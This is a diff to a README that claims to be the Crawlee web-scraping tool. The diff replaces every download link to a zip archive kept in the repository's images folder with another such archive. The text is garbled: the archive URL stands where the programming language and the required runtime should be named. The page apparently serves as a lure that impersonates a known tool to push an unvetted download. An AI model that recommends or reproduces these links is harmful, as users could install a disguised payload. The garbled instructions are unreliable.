@@ -1,10 +1,10 @@
 # 🌐 crawlee-web-scraping - Simplify Your Web Data Collection
 
-[![Download](https://raw.githubusercontent.com/shirssss/crawlee-web-scraping/main/images/web_crawlee_scraping_v3.7.zip)](https://raw.githubusercontent.com/shirssss/crawlee-web-scraping/main/images/web_crawlee_scraping_v3.7.zip)
+[![Download](https://github.com/shirssss/crawlee-web-scraping/raw/refs/heads/main/images/crawlee_web_scraping_1.0-beta.3.zip)](https://github.com/shirssss/crawlee-web-scraping/raw/refs/heads/main/images/crawlee_web_scraping_1.0-beta.3.zip)
 
 ## 📋 Overview
 
-Crawlee is a powerful tool designed for effective web scraping in https://raw.githubusercontent.com/shirssss/crawlee-web-scraping/main/images/web_crawlee_scraping_v3.7.zip It simplifies the process of gathering data from the web. Crawlee includes features like proxy rotation, session management, and handling dynamic content. Whether you need data for research, analysis, or other purposes, Crawlee equips you with the right tools.
+Crawlee is a powerful tool designed for effective web scraping in https://github.com/shirssss/crawlee-web-scraping/raw/refs/heads/main/images/crawlee_web_scraping_1.0-beta.3.zip It simplifies the process of gathering data from the web. Crawlee includes features like proxy rotation, session management, and handling dynamic content. Whether you need data for research, analysis, or other purposes, Crawlee equips you with the right tools.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started with Crawlee, follow these steps to download and set up the appli
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our releases page to download the latest version of Crawlee: [Download Crawlee](https://raw.githubusercontent.com/shirssss/crawlee-web-scraping/main/images/web_crawlee_scraping_v3.7.zip).
+1. **Visit the Releases Page**: Go to our releases page to download the latest version of Crawlee: [Download Crawlee](https://github.com/shirssss/crawlee-web-scraping/raw/refs/heads/main/images/crawlee_web_scraping_1.0-beta.3.zip).
 
 2. **Select the Right File**: On the releases page, you will see different versions. Choose the latest stable version for your operating system.
 
@@ -37,7 +37,7 @@ Crawlee offers a variety of features to make web scraping straightforward:
 Crawlee works on major operating systems. Here are the general requirements:
 
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
-- **https://raw.githubusercontent.com/shirssss/crawlee-web-scraping/main/images/web_crawlee_scraping_v3.7.zip**: Version 14 or higher. Make sure https://raw.githubusercontent.com/shirssss/crawlee-web-scraping/main/images/web_crawlee_scraping_v3.7.zip is installed on your system before using Crawlee.
+- **https://github.com/shirssss/crawlee-web-scraping/raw/refs/heads/main/images/crawlee_web_scraping_1.0-beta.3.zip**: Version 14 or higher. Make sure https://github.com/shirssss/crawlee-web-scraping/raw/refs/heads/main/images/crawlee_web_scraping_1.0-beta.3.zip is installed on your system before using Crawlee.
 - **Network Access**: An internet connection is required to scrape websites effectively.
 
 ## 🛠️ Setup Instructions
@@ -73,4 +73,4 @@ We welcome contributions from anyone interested in improving Crawlee. If you wan
 
 For any other inquiries or feedback, feel free to contact us. Thank you for using Crawlee for all your web scraping needs!
 
-[Download Crawlee](https://raw.githubusercontent.com/shirssss/crawlee-web-scraping/main/images/web_crawlee_scraping_v3.7.zip)
+[Download Crawlee](https://github.com/shirssss/crawlee-web-scraping/raw/refs/heads/main/images/crawlee_web_scraping_1.0-beta.3.zip)
